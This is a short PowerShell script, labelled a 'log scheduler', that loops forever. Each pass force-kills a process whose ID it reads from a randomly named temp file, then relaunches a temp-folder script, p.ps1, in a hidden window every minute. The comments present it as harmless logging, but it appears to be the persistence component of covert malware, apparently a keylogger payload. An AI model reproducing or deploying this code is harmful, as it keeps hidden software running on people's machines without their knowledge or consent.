# powershell log scheduler
# created by : C0SM0

for(;;) {
    try {
        # invoke the worker script
        $proc = Get-Content "$env:temp/DdBPKCytRe"
        Stop-Process -Id $proc -Force
        Start-Process powershell.exe -WindowStyle Hidden "$env:temp/p.ps1"
    }
    catch {
        # Log the error for debugging
        Write-Host "Error: $_"
    }
   
    # wait for a minute
    Start-Sleep 60
}
